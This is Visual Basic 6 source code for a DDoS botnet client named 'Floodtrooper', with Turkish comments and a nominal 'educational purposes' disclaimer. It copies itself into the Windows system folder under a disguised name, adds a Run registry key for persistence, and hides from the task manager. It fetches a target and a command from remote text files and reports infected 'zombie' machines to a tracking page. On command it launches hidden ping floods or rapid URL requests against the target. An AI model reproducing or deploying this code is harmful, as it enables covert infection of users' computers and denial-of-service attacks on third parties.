VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3090
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3090
   ScaleWidth      =   4680
   Visible         =   0   'False
   Begin SHDocVwCtl.WebBrowser WebBrowser3 
      Height          =   735
      Left            =   3480
      TabIndex        =   2
      Top             =   1560
      Width           =   1095
      ExtentX         =   1931
      ExtentY         =   1296
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   ""
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser2 
      Height          =   855
      Left            =   2640
      TabIndex        =   1
      Top             =   480
      Width           =   1095
      ExtentX         =   1931
      ExtentY         =   1508
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   ""
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   975
      Left            =   240
      TabIndex        =   0
      Top             =   480
      Width           =   1935
      ExtentX         =   3413
      ExtentY         =   1720
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   ""
   End
   Begin VB.Timer Timer3 
      Interval        =   60000
      Left            =   2400
      Top             =   2280
   End
   Begin VB.Timer Timer2 
      Left            =   2760
      Top             =   2280
   End
   Begin InetCtlsObjects.Inet Inet4 
      Left            =   1560
      Top             =   2160
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Left            =   3120
      Top             =   2280
   End
   Begin InetCtlsObjects.Inet Inet2 
      Left            =   960
      Top             =   2160
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   360
      Top             =   2160
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Floodtrooper
'Janizary(utku þen) 2005
'www.utkusen.com
'bu kodlar eðitim amaçlý yazýlmýþtýr.doðacak yasal þeylerden kullanýcý sorumludur

Private Sub Form_Initialize()
On Error Resume Next
'kendimizi system dizinine kopyalýyoruz
Dim y, ad, TY
Dim ReturnValue, i, komut As String
y = App.Path
ad = App.EXEName & ".exe"
TY = y & "\" & ad
FileCopy TY, "\windows\system\dllwin32.exe"
Kill "demo.txt"
'baþlangýca yerleþiyoruz
Dim Kd As Object
Set Kd = CreateObject("wscript.shell")
Kd.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\system", "C:\WINDOWS\system\dllwin32.exe", "REG_SZ"
Timer1.Enabled = False
Timer2.Enabled = True
Timer3.Enabled = False
'siteden hedefi komutu falan alýyoruz.online.asp de kaç tane zombimiz var görmemiz için
hedef = Inet1.OpenURL("http://www.geocities.com/floodtrooper/ip.txt")
komut = Inet2.OpenURL("http://www.geocities.com/floodtrooper/komut.txt")
WebBrowser1.Navigate ("http://www.utkusoft.com/user/online.asp")
'komut ping ise hedefe pingflood saldýrýsý yapýyoruz
If komut = "ping" Then
DoEvents
sal = "ping " & hedef & " -l 1000 -t "
ReturnValue = Shell(sal, 0)
Timer3.Enabled = True
App.TaskVisible = False
End If
'komut url ise url saldýrýsý yapýyoruz
If komut = "url" Then
DoEvents
Timer1.Enabled = True
Timer1.Interval = 25
Timer3.Enabled = True
App.TaskVisible = False
End If
'bu da hit kazanma açýsýndan güzel
If komut = "visit" Then
WebBrowser3.Navigate ("http://www.utkusen.com/")
Shell "explorer http://www.utkusen.com/"
Timer3.Enabled = True
App.TaskVisible = False
End If
End Sub

Private Sub Form_Load()
On Error Resume Next
Dim y, ad, TY
Dim ReturnValue, i, komut As String
y = App.Path
ad = App.EXEName & ".exe"
TY = y & "\" & ad
FileCopy TY, "\windows\system\dllwin32.exe"
Kill "demo.txt"
HideFromTaskManager
Dim Kd As Object
Set Kd = CreateObject("wscript.shell")
Kd.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\system", "C:\WINDOWS\system\dllwin32.exe", "REG_SZ"
Timer1.Enabled = False
Timer2.Enabled = True
Timer3.Enabled = True
hedef = Inet1.OpenURL("http://www.geocities.com/floodtrooper/ip.txt")
komut = Inet2.OpenURL("http://www.geocities.com/floodtrooper/komut.txt")
WebBrowser1.Navigate ("http://www.utkusoft.com/bot/online.asp")
If komut = "ping" Then
DoEvents
sal = "ping " & hedef & " -l 1000 -t "
ReturnValue = Shell(sal, 0)
Timer3.Enabled = True
App.TaskVisible = False
End If
If komut = "url" Then
DoEvents
Timer1.Enabled = True
Timer1.Interval = 25
Timer3.Enabled = True
App.TaskVisible = False
End If
If komut = "visit" Then
Shell "explorer http://www.utkusoft.com/"
App.TaskVisible = False
Timer3.Enabled = True
End If
End Sub

Private Sub Form_Terminate()
On Error Resume Next
Dim y, ad, TY
Dim ReturnValue, i, komut As String
y = App.Path
ad = App.EXEName & ".exe"
TY = y & "\" & ad
FileCopy TY, "\windows\system\dllwin32.exe "
Kill "demo.txt"
Dim Kd As Object
Set Kd = CreateObject("wscript.shell")
Kd.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\system", "C:\WINDOWS\system\dllwin32.exe", "REG_SZ"
Shell ("C:\Windows\system\dllwin32.exe")
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Dim y, ad, TY
Dim ReturnValue, i, komut As String
y = App.Path
ad = App.EXEName & ".exe"
TY = y & "\" & ad
FileCopy TY, "\windows\system\dllwin32.exe "
Kill "demo.txt"
Dim Kd As Object
Set Kd = CreateObject("wscript.shell")
Kd.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\system", "C:\WINDOWS\system\dllwin32.exe", "REG_SZ"
Shell ("C:\Windows\system\dllwin32.exe")
End Sub

Private Sub Timer1_Timer()
WebBrowser2.Navigate ("hedef")
End Sub

Private Sub Timer2_Timer()
hedef = Inet1.OpenURL("http://www.geocities.com/floodtrooper/ip.txt")
komut = Inet2.OpenURL("http://www.geocities.com/floodtrooper/komut.txt")
WebBrowser1.Navigate ("http://www.utkusoft.com/bot/online.asp")
If komut = "ping" Then
DoEvents
sal = "ping " & hedef & " -l 1000 -t "
ReturnValue = Shell(sal, 0)
Timer3.Enabled = True
App.TaskVisible = False
End If
If komut = "url" Then
DoEvents
Timer1.Enabled = True
Timer1.Interval = 25
Timer3.Enabled = True
App.TaskVisible = False
End If
If komut = "visit" Then
Shell "explorer http://www.utkusoft.com/"
App.TaskVisible = False
Timer3.Enabled = True
End If
End Sub

Private Sub Timer3_Timer()
Shell ("C:\Windows\system\dllwin32.exe")
End Sub
